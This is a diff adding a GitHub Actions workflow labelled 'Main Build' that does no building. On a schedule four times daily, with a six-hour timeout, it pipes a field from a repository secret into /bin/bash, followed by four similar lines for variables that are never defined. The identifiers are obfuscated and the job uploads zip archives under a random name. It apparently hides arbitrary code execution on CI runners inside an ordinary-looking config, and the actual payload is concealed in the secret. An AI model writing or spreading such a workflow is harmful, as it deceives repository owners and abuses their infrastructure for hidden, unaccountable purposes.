@@ -1,0 +1,41 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '4 2,8,14,20 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  service:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run
+        env:
+          w38: ${{ secrets.w38 }}
+        run: |
+          printf '%s' "$w38" | jq -r .x618 | /bin/bash
+          printf '%s' "$yf21" | jq -r .cjeh01522 | /bin/bash
+          echo $yvtbb2972 | jq -r .chqy964 | /bin/bash
+          echo $vzjhv2639 | jq -r .n81213 | /bin/bash
+          echo $rb9 | jq -r .xu16 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: HSFbrixy
+          path: "*.zip"
+          retention-days: 1
